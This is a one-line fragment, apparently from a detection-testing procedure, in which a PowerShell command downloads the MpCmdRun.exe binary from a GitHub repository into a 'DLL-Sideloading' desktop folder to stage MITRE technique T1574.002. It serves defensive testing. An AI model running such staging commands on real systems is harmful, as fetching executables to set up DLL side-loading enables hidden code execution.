...
Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/MpCmdRun.exe" -OutFile "c:\$env:USERNAME\Desktop\DLL-Sideloading\MpCmdRun.exe"
